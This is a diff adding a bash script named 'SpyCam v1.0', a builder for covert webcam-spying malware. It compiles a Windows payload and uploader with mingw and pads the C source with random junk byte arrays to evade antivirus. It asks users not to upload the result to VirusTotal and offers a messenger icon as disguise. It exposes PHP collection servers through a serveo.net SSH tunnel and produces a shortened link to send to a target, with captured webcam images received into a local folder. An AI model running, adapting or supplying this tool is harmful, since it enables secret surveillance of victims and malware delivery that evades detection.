@@ -1,0 +1,219 @@
+#!/bin/bash
+# SpyCam v1.0
+# Coded by @linux_choice (Don't change! Read the License!)
+# Github: https://github.com/thelinuxchoice/spycam
+
+host="http://serveo.net" #"159.89.214.31" #Serveo.net (Port Forwarding Tunneling)
+
+trap 'printf "\n";stop' 2
+
+banner() {
+ 
+printf "\e[1;77m  ____               ____                 \n"
+printf " / ___| _ __  _   _ / ___|__ _ _ __ ___     ,-\"\"-. \n"
+printf " \___ \| '_ \| | | | |   / _\` | '_ \` _ \   /\e[0m\e[1;93m ,--.\e[0m\e[1;77m \  \n"
+printf "  ___) | |_) | |_| | |__| (_| | | | | | | | \e[0m\e[1;93m(\e[0m\e[1;31m ()\e[0m\e[1;77m \e[0m\e[1;93m)\e[0m\e[1;77m | \n"
+printf " |____/| .__/ \__, |\____\__,_|_| |_| |_|  \ \e[0m\e[1;93m\`--'\e[0m\e[1;77m / \n"
+printf "       |_|    |___/ v1.0                    \`-..-'   \e[0m\n"
+
+printf "\n"
+printf "\e[1;93m Coded by:\e[0m\e[1;77m https://github.com/thelinuxchoice/spycam\e[0m"
+printf "\n"
+
+#printf "\e[1;77m          .:.:\e[0m\e[1;77m ScreenShot Hijack v1.0 \e[0m\e[1;77m:.:.\e[0m\n"                              
+#printf "\e[1;93m         .:.:\e[0m\e[1;93m Coded by: \e[0m\e[1;77m @linux_choice\e[0m \e[1;93m:.:.\e[0m\n"
+printf "\n"
+printf "     \e[101m::  Warning: Attacking targets without  ::\e[0m\n"
+printf "     \e[101m::  prior mutual consent is illegal!    ::\e[0m\n"
+printf "\n"
+
+}
+
+
+stop() {
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
+fi
+exit 1
+
+}
+
+dependencies() {
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 
+command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: \"bash install.sh\" .Aborting."; 
+exit 1; }
+
+}
+
+wait_file() {
+
+while [ true ]; do
+if [[ -e Log.log ]]; then
+printf "\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] WebCam Image Received! [Saved in: uploadedfiles/ ]\e[0m\n"
+cat Log.log >> log.backup
+rm -rf Log.log
+
+fi
+sleep 0.5
+done
+
+}
+
+server() {
+
+if [[ ! -d uploadedfiles ]]; then
+mkdir uploadedfiles/
+fi
+printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net -R '$default_port3':localhost:'$default_port2'  2> /dev/null > sendlink ' &
+printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m]\e[0m\e[1;92m TCP Forwarding:\e[0m\e[1;77m serveo.net:%s/\e[0m\n" $default_port3
+sleep 7
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+
+printf "\n"
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/%s.exe \n' $send_link $payload_name
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.exe | head -n1)
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf "\n"
+printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting php server1... (localhost:%s)\e[0m\n" $port
+php -S localhost:$port > /dev/null 2>&1 &
+sleep 2
+printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Starting php server2... (localhost:%s)\e[0m\n" $default_port2
+php -S localhost:$default_port2  > /dev/null 2>&1 &
+sleep 3
+printf "\n"
+printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting WebCam Image Files...\e[0m\n'
+wait_file
+printf "\n"
+
+}
+
+compile() {
+
+if [[ ! -e cam.c ]]; then
+printf "\e[1;93m[!] Error...\e[0m\n"
+exit 1
+else
+printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Compiling Uploader... \e[0m\n"
+i686-w64-mingw32-gcc up.c -o uploader.exe -DCURL_STATICLIB -static -lstdc++ -lgcc -lpthread -lcurl -lwldap32 -lws2_32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include -pthread
+printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Compiling Payload... \e[0m\n"
+#i686-w64-mingw32-windres icon.rc -O coff -o my.res
+i686-w64-mingw32-gcc cam.c -o $payload_name.exe
+#i686-w64-mingw32-gcc cam.c my.res -o $payload_name.exe -DCURL_STATICLIB -static -lstdc++ -lgcc -lpthread -lcurl -lwldap32 -lws2_32 -L/usr/i686-w64-mingw32/lib -I/usr/i686-w64-mingw32/include -pthread
+printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s.exe\n" $payload_name
+printf "\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, don't upload to virustotal.com !\e[0m\n"
+rm -rf up.c cam.c
+#rm -rf icon.rc
+#rm -rf my.res
+fi
+
+}
+
+icon() {
+
+default_payload_icon="icon/messenger.ico"
+printf '\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put ICON path (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_icon
+read payload_icon
+payload_icon="${payload_icon:-${default_payload_icon}}"
+
+if [[ ! -e $payload_icon ]]; then
+printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] File not Found! Try Again! \e[0m\n'
+icon
+else
+if [[ $payload_icon != *.ico ]]; then
+printf '\n\e[1;93m[\e[0m\e[1;77m!\e[0m\e[1;93m] Please, use *.ico file format. Try Again! \e[0m\n'
+icon
+fi
+fi
+
+}
+
+start() {
+rm -rf Log.log
+default_port=$(seq 1111 4444 | sort -R | head -n1)
+default_port2=$(seq 1111 4444 | sort -R | head -n1)
+default_port3=$(seq 1111 4444 | sort -R | head -n1)
+#printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Random:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
+#read port
+port="${port:-${default_port}}"
+default_payload_name="payload"
+printf '\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_payload_name
+read payload_name
+payload_name="${payload_name:-${default_payload_name}}"
+#icon
+payload
+compile
+server
+
+}
+
+#generatePadding function from powerfull.sh file (by https://github.com/Screetsec/TheFatRat/blob/master/powerfull.sh)
+function generatePadding {
+
+    paddingArray=(0 1 2 3 4 5 6 7 8 9 a b c d e f)
+
+    counter=0
+    randomNumber=$((RANDOM%${randomness}+23))
+    while [  $counter -lt $randomNumber ]; do
+        echo "" >> cam.c
+        echo "" >> up.c
+	randomCharnameSize=$((RANDOM%10+7))
+        randomCharname=`cat /dev/urandom | tr -dc 'a-zA-Z' | head -c ${randomCharnameSize}`
+	echo "unsigned char ${randomCharname}[]=" >> cam.c
+	echo "unsigned char ${randomCharname}[]=" >> up.c
+    	randomLines=$((RANDOM%20+13))
+	for (( c=1; c<=$randomLines; c++ ))
+	do
+		randomString="\""
+		randomLength=$((RANDOM%11+7))
+		for (( d=1; d<=$randomLength; d++ ))
+		do
+			randomChar1=${paddingArray[$((RANDOM%15))]}
+			randomChar2=${paddingArray[$((RANDOM%15))]}
+			randomPadding=$randomChar1$randomChar2
+	        	randomString="$randomString\\x$randomPadding"
+		done
+		randomString="$randomString\""
+		if [ $c -eq ${randomLines} ]; then
+			echo "$randomString;" >> cam.c
+			echo "$randomString;" >> up.c
+		else
+			echo $randomString >> cam.c
+			echo $randomString >> up.c
+		fi
+	done
+        let counter=counter+1
+    done
+}
+
+payload() {
+
+printf "#include <stdio.h>\n" > cam.c
+printf "#include <stdio.h>\n" > up.c
+printf "#include <winsock2.h>\n" >> cam.c
+printf "#include <winsock2.h>\n" >> up.c
+printf "#include <windows.h>\n" >> cam.c
+printf "#include <windows.h>\n" >> up.c
+printf "#include <string.h>\n" >> up.c
+printf "#include <curl/curl.h>\n" >> up.c
+printf "#include <stdlib.h>\n" >> up.c
+generatePadding
+generatePadding
+sed 's+serveo_port+'$default_port3'+g' spy.c >> cam.c
+sed 's+serveo_port+'$default_port3'+g' uploader.c >> up.c
+generatePadding 
+generatePadding
+#printf "id ICON \"%s\"" $payload_icon  > icon.rc
+
+}
+
+banner
+dependencies
+start
